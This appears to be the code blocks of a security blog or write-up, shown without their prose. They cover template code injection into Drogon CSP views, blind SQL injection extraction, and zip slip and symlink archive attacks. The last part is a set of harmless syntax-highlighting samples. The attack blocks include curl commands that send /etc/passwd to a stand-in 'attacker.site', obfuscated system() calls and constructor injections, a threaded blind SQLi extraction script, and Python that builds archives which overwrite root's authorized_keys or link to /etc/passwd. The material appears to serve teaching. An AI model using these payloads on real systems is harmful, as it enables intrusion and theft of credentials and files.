    "/hello/{}",
    [](const HttpRequestPtr& req, std::function<void(const HttpResponsePtr&)>&& callback, const std::string& name) {
        HttpViewData data;
        data.insert("name", name);
        auto resp = HttpResponse::newHttpViewResponse("Example.csp", data);
        callback(resp);
    });
```

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Hi Picard</h1>
</body>
</html>
```

```json
"load_dynamic_views": true,
"dynamic_views_path": ["./views/d"],
```

```cpp
app().enableDynamicViewsLoading({"./views/d"}, "./views/d");
```

```sh
drogon_ctl create view Example.csp
```

```csp {data-label=Example.csp}
<h1>Example</h1>
<%c++ int a = 40 + 2; $$ << a; %>
<h2>Hello world!</h2>
```

```cpp {data-label=Example.cc}
// Boilerplate: includes...
using namespace drogon;
std::string Example::genText(const DrTemplateData& Example_view_data)
{
    drogon::OStringStream Example_tmp_stream;
    std::string layoutName{""};
    Example_tmp_stream << "<h1>Example</h1>\n";
    int a = 40 + 2; Example_tmp_stream << a; 
    Example_tmp_stream << "<h2>Hello world!</h2>\n";
    // Boilerplate: convert stream to string and return...
}
```

```csp {data-label=Example.csp}
<%inc
#include <algorithm>
#define MY_MACRO
void my_function() {}
%>
<h1>Example</h1>
```

```cpp {data-label=Example.cc}
// Boilerplate: includes...
#include <algorithm>
#define MY_MACRO
void my_function() {}

using namespace drogon;
std::string Example::genText(const DrTemplateData& Example_view_data)
{
    drogon::OStringStream Example_tmp_stream;
    std::string layoutName{""};
    Example_tmp_stream << "<h1>Example</h1>\n";
    // Boilerplate: convert stream to string and return...
}
```

```csp {data-label=Example.csp}
<h1>Hi [[name]]!</h1>
```

```cpp {data-label=Example.cc}
// ...
Example_tmp_stream << "<h1>Hi ";
{
    auto & val=Example_view_data["name"];
    if(val.type()==typeid(const char *)){
        Example_tmp_stream<<*(std::any_cast<const char *>(&val));
    }else if(val.type()==typeid(std::string)||val.type()==typeid(const std::string)){
        Example_tmp_stream<<*(std::any_cast<const std::string>(&val));
    }
}
Example_tmp_stream << "!</h1>\n";
// ...
```

```csp {data-label=Example.csp}
<%c++
    system("curl http://attacker.site --data @/etc/passwd");
%>
```

```csp
<%inc
#include <fstream>
#include <sstream>
%>
<%c++
    std::ifstream ifs{"/etc/passwd"};
    if (ifs.is_open()) {
        $$ << ifs.rdbuf();
    } else {
        $$ << "Failed to open file.";
    }
%>
```

```csp
<%inc
#include <unistd.h>
%>
<%c++
    char buffer[99] = {};
    read(open("/etc/passwd", 0), buffer, 99);
    $$ << buffer;
%>
```

```csp
<%inc
#include <unistd.h>
%>
<%c++
    char buffer[99] = {};
    syscall(0, syscall(2, "/etc/passwd", 0       ), buffer, 99);
//  read(      open(      "/etc/passwd", O_RDONLY), buffer, 99);
    $$ << buffer;
%>
```

```csp
<%inc
#include <unistd.h>
%>
<%c++
    const char* argv[] = {
        "/usr/bin/curl",
        "http://attacker.site",
        "--data",
        "@/etc/passwd",
        NULL
    };
    syscall(59, "/usr/bin/curl", argv, 0);
%>
```

```csp
<%inc
#include <unistd.h>
#include <sys/mman.h>
%>
<%c++
    $$ << (char*)mmap(NULL, 99, 1, 2, syscall(2,"/etc/passwd", 0), 0);
    // mmap(addr, length, memory_protection, flags, fd, offset)
%>
```

```csp
<%c++
    char file[] = "/etc/passwd", buffer[256] = {0};
    asm(R"(
        mov $2, %%rax;
        lea (%0), %%rdi;
        mov $0, %%rsi;
        syscall;
        
        mov %%rax, %%rdi;
        mov $0, %%rax;
        lea (%1), %%rsi;
        mov $255, %%rdx;
        syscall
    )"
        : : "b" ( file ), "d" ( buffer )
    );
    $$ << buffer;
%>
```

```csp {data-label=Example.csp}
<%inc #include "safe.txt" %>
```

```cpp {data-label=safe.txt}
system("curl http://attacker.site --data @/etc/passwd");
```

```cpp
#define STR(X) #X
// STR(abc) == "abc"
```

```cpp
#define GLUE(X, Y) X ## Y
GLUE(c, out) << "hello world!" << GLUE(e, ndl); // cout << "hello world!" << endl;

#define GLUE2(X) X ## _literally
int GLUE2(var) = 1; // int var_literally = 1;
```

```csp
<%inc #define GLUE(X, Y) X ## Y %>
<%c++
    GLUE(s, ystem)("curl http://attacker.site --data @/etc/passwd");
%>
```

```csp
<%inc
// 1. Assign variable with function call.
int a = system("curl http://attacker.site --data @/etc/passwd");

// 2. To run more code, we can create a function first.
int foo() {
    return system("curl http://attacker.site --data @/etc/passwd");
}
int b = foo();

// 3. GCC attributes - gets called automatically.
__attribute__((constructor))
void bar() {
    system("curl http://attacker.site --data @/etc/passwd");
}
%>
```

```csp {data-label=Example.csp}
<%c++ 
} 
__attribute__((constructor)) void injected()
{
    system("curl http://attacker.site --data @/etc/passwd");
}
std::string dummy(const DrTemplateData&)
{
    drogon::OStringStream Example_tmp_stream;
    std::string layoutName{""};
%>
```

```cpp {data-label=Example.cc}
// Boilerplate: includes...
std::string Example::genText(const DrTemplateData& Example_view_data)
{
    drogon::OStringStream Example_tmp_stream;
    std::string layoutName{""};
 
} 
__attribute__((constructor)) void injected()
{
    system("curl http://attacker.site --data @/etc/passwd");
}
std::string dummy(const DrTemplateData&)
{
    drogon::OStringStream Example_tmp_stream;
    std::string layoutName{""};
    // Boilerplate: convert stream to string and return....
```

```csp
<h1>Hi [[name"];}}__attribute__((constructor))void/**/injected(){system("...");}std::string/**/dummy(const/**/DrTemplateData&data){drogon::OStringStream/**/Example_tmp_stream;std::string/**/layoutName{""};{auto&val=data["]]</h1>
```

```python {data-label=server.py data-lang-off}
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Check if username/password exists.
    query = "SELECT * FROM users WHERE username='{}' AND password='{}'".format(username, password)
    c = conn.cursor()
    c.execute(query)
    user = c.fetchone()

    if user:
        return 'Login successful!'
    else:
        return 'Login failed.'
```

```sql
SELECT * FROM users WHERE username='' OR 1=1-- ' AND password='...'
```

```python {data-lang-off}
import requests

def check_sql_value(sql_query: str, idx: int, guess: int) -> bool:
    url = 'http://127.0.0.1:5000/login'
    data = {
        'username': '1',
        'password': f"' OR UNICODE(SUBSTRING({sql_query}, {idx}, 1)) = {guess} -- "
    }
    r = requests.post(url, data=data)
    return 'success' in r.text

max_data_len = 256
final_data = ''

# SQL's SUBSTRING uses 1-based indexing.
for idx in range(1, max_data_len):
    for guess in range(1, 128):
        if check_sql_value('sqlite_version()', idx, guess):
            final_data += chr(guess)
            print(final_data)
            break
    else:
        # No valid ASCII chars found. Probably end of string.
        break
```

```python {data-lang-off}
def binary_search(val: int, low: int, high: int) -> int:
    """Binary search for value between low (inclusive) and high (exclusive),
    assuming the guessed value is within range."""
    while low < high:
        mid = (low + high) // 2
        if low == mid:
            return mid # Found val.
        
        print(f'{low:3} - {high:3}\tGuess: {mid:4}')
        if val < mid:
            high = mid  # Eliminate upper half.
        else:
            low = mid   # Eliminate lower half.
```

```python {.command-line data-prompt=">>>" data-filter-output="out>" data-lang-off}
print('result:', binary_search(125, 0, 128))
out>  0 - 128       Guess:   64
out> 64 - 128       Guess:   96
out> 96 - 128       Guess:  112
out>112 - 128       Guess:  120
out>120 - 128       Guess:  124
out>124 - 128       Guess:  126
out>124 - 126       Guess:  125
out>result: 125
```

```python {data-lang-off}
def binary_search(sql_query: str, idx: int, low: int, high: int) -> int:
    """Find the value of sql_query using binary search, between
    low (inclusive) and high (exclusive). Assuming the guessed value
    is within range."""
    while low < high:
        mid = (low + high) // 2
        if low == mid:
            return mid # Found val.
        
        if check_sql_value(sql_query, idx, mid):
            high = mid
        else:
            low = mid

def check_sql_value(sql_query: str, idx: int, guess: int) -> bool:
    # Make web request to check ASCII(SUBSTRING(sql_query, idx, 1)) < guess.
    # And then check if the response is a TRUE or FALSE response.
    ...

for idx in range(1, 256):
    val = binary_search("@@version", idx, 0, 128)
    # Handle `val`...
```

```python {data-lang-off}
binary_search("@@version", idx, low, high)
```

```python {data-lang-off}
with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
    future_map = {}

    # Create a task for each character.
    for idx in range(length):
        future = executor.submit(get_by_bsearch, f"ASCII(SUBSTRING(({sql}),{idx+1},1))", 0, 128)
        future_map[future] = idx

    # Handle finished tasks concurrently.
    for future in concurrent.futures.as_completed(future_map):
        idx = future_map[future]
        ch = future.result()
        # We found the character at a particular index!
        # Store it somewhere...
        somewhere[idx] = ch
```

```python {data-lang-off}
length = get_by_bsearch(f"LENGTH(({sql}))", 0, 2048)
```

```python {data-lang-off}
sql = input("sqli> ")
```

```python {data-lang-off}
prompt = PromptSession(history=FileHistory(".history"))
sql = prompt.prompt("sqli> ")
```

```sh
# By default, only the first 1000 ports are scanned.
nmap -sS -T4 ...
# Run a full port scan in a different tab...
nmap -sS -T4 -p- ...
```

```text {data-lang-off}
foo.zip
└── data1.csv
└── data2.txt
└── ...
```

```text {data-lang-off}
evil-slip.zip
└── placeholder.txt
└── ../../root/.ssh/authorized_keys
```

```text {data-lang-off}
/
├── app/
│	└── uploads/
│	    └── placeholder.txt
└── root/
    └── .ssh/
		└── authorized_keys
```

```python
import zipfile

with zipfile.ZipFile("evil-slip.zip", "w") as zip:
    zip.write("my-ssh-key.pub", "../../root/.ssh/authorized_keys")
    #          │                 └ filename to store on the archive
    #          └ file to compress from our local file system
```

```shell {.command-line data-prompt="$" data-filter-output="out>"}
touch ../../root/.ssh/authorized_keys
out>Normally we would run `ssh-keygen` to generate a key pair...
out>and use the generated public key as our authorized_keys.
out>But let's assume ../.ssh/authorized_keys holds a public key.
out>
zip evil-slip ../../root/.ssh/authorized_keys
out>  adding: ../../root/.ssh/authorized_keys (deflated 18%)
out>
unzip -l evil-slip
out>Archive:  evil-slip.zip
out>  Length      Date    Time    Name
out>---------  ---------- -----   ----
out>      575  01-23-2024 17:53   ../../root/.ssh/authorized_keys
out>---------                     -------
out>      575                     1 file
```

```text {data-lang-off}
evil-link-file.zip
└── passwd.txt         -> /etc/passwd
```

```text {data-lang-off}
app/
└── uploads/
	└── passwd.txt     -> /etc/passwd
```

```text {data-lang-off}
evil-link-dir.zip
└── dirlink/           -> /root/.ssh/
    └── authorized_keys
```

```text {data-lang-off}
/
├── app/
│	└── uploads/
│	    └── dirlink        -> /root/.ssh/
└── root/
    └── .ssh/
		└── authorized_keys
```

```python
# evil-link-file.zip
# └── passwd.txt         -> /etc/passwd
with zipfile.ZipFile("evil-link-file.zip", "w", compression=zipfile.ZIP_DEFLATED) as zip:
  # This creates a file symlink named `passwd.txt` which links to `/etc/passwd`.
  info = zipfile.ZipInfo("passwd.txt")
  info.create_system = 0 # Linux => 0. Windows => 3.
  info.external_attr = (stat.S_IFLNK | 0o777) << 16 # File attributes.
  zip.writestr(info, "/etc/passwd")  # /etc/passwd is the file we want to read.
```

```python
# evil-link-dir.zip
# └── dirlink/           -> /root/.ssh/
#     └── authorized_keys
with zipfile.ZipFile("evil-link-dir.zip", "w", compression=zipfile.ZIP_DEFLATED) as zip:
  info = zipfile.ZipInfo("dirlink")
  info.create_system = 0
  info.external_attr = (stat.S_IFLNK | 0o777) << 16
  zip.writestr(info, "/root/.ssh/")

  # Add an file from our filesystem. (Not a symlink.)
  zip.write("my-ssh-key.pub", "dirlink/authorized_keys")
```

```python
# evil-link-dir.zip
# └── dirlink/           -> /some/readable/directory/
#     └── passwd.html    -> /etc/passwd
with zipfile.ZipFile("evil-link-dir-file.zip", "w", compression=zipfile.ZIP_DEFLATED) as zip:
  # Order matters! Write dir first, then file.
  info = zipfile.ZipInfo("dirlink")
  info.create_system = 0
  info.external_attr = (stat.S_IFLNK | 0o777) << 16
  zip.writestr(info, "/some/readable/directory/")

  info = zipfile.ZipInfo("dirlink/passwd.html")
  info.create_system = 0
  info.external_attr = (stat.S_IFLNK | 0o777) << 16
  zip.writestr(info, "/etc/passwd")
```

```sh {.command-line data-prompt="$" data-filter-output="# "}
# Create our (soft) links.
ln -s /some/readable/directory/ dirlink
ln -s /etc/passwd dirlink/passwd.txt
# Zip the links. (Order matters!)
zip -y evil-link-dir-file dirlink dirlink/passwd.txt
```

```sh {.command-line data-prompt="$" data-filter-output="# "}
# Create a blank file with 5GB of null bytes.
dd if=/dev/zero bs=20000 count=250000 >zero.txt
# 
# Zip it.
zip test.zip test.txt
# 
# Count the number of bytes.
wc -c zero.txt zero.zip
#  5000000000 zero.txt
#  4852639 zero.zip
#  5004852639 total
```

```cpp
if (!fileToUnzip.isAChildOf(directoryToUnzipTo))
  // Attack attempt detected: attempted write outside of unzip directory.
  return Result::fail("...");
```

```txt {data-lang-off}
SGVsbG8gd29ybGQhCg==
```

```py
print("Hello world!")
```

```c
#include <stdio.h>

int main() {
    printf("Hello world!\n");
}
```

```scala
object HelloWorld {
  def main(args: Array[String]): Unit = {
    println("Hello world!")
  }
}
```

```rust
fn main() {
    println!("Hello world!");
}
```

```sql
SELECT 'Hello' || ' ' || 'world!';
```

```haskell
main :: IO ()
main = putStrLn "Hello world!"
```

```cpp
#include <iostream>

int main() {
    std::cout << "Hello world!" << std::endl;
}
```

```js
console.log("Hello world!");
```

```sh
echo test
```

```c
printf("Bzzz... target acquired~");
```

```cpp
#include <iostream>
int main() {
   
}
```

```cpp
#include <iostream>

int main() {
    std::cout << "Hello world!" << std::endl;
}
```

```rust
fn main() {
    println!("Hello world!");
}
```

```haskell
main :: IO ()
main = putStrLn "Hello world!"
```

```scala {.line-numbers}
object HelloWorld {
  def main(args: Array[String]): Unit = {
    println("Hello world!")
  }
}
```

```sh
echo "Hello world!"
```

```
Just plain text.
```

```txt {data-test=true data-filename-abc="a/file/path"}
Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! 
```

```txt {.line-numbers data-start=2}
This raw text
is not highlighted
but it still has
line numbers
```

```cpp {.line-numbers data-start=3 data-output=2,5-6}
int main() {
  // This line is skipped.
  Dog d;
  d.speak();
  // These lines are 
  // also skipped.
}
```

```sh {.command-line data-output=1}
# Multiline.
mkdir build
cd build
cmake ..
make
```

```txt {.command-line .line-numbers data-output=6}
What
if
we
mix
command line
# woohoo!
and
line numbers?
More
MOre
MORE
MOREEE
```

```powershell {.command-line data-prompt="PS C:\Users\Chris>" data-output=2-19}
dir


    Directory: C:\Users\Chris


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d-r--        10/14/2015   5:06 PM            Contacts
d-r--        12/12/2015   1:47 PM            Desktop
d-r--         11/4/2015   7:59 PM            Documents
d-r--        10/14/2015   5:06 PM            Downloads
d-r--        10/14/2015   5:06 PM            Favorites
d-r--        10/14/2015   5:06 PM            Links
d-r--        10/14/2015   5:06 PM            Music
d-r--        10/14/2015   5:06 PM            Pictures
d-r--        10/14/2015   5:06 PM            Saved Games
d-r--        10/14/2015   5:06 PM            Searches
d-r--        10/14/2015   5:06 PM            Videos
```

```diff-js
+function myFunction() {
   // …
-  return true;
 }
```

```diff-js {.line-numbers}
+function myFunction() {
   // …
-  return true;
 }
```

```js {data-label="prism-show-filename.js" .line-numbers data-start=13}
Prism.plugins.toolbar.registerButton('show-filename', function (env) {
  var pre = env.element.parentNode;
  if (!pre || !/pre/i.test(pre.nodeName)) {
    return;
  }

  var filename = pre.getAttribute('data-filename');
  if (!filename) {
      return;
  }

  var element = document.createElement('span');
  element.textContent = filename;

  return element;
});
```

```txt {data-label="Just a casual label."}
Hello world!
```

```sh
echo "Conversely, if you drive, don't drink."
echo "test"
```

```txt
Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious!
```

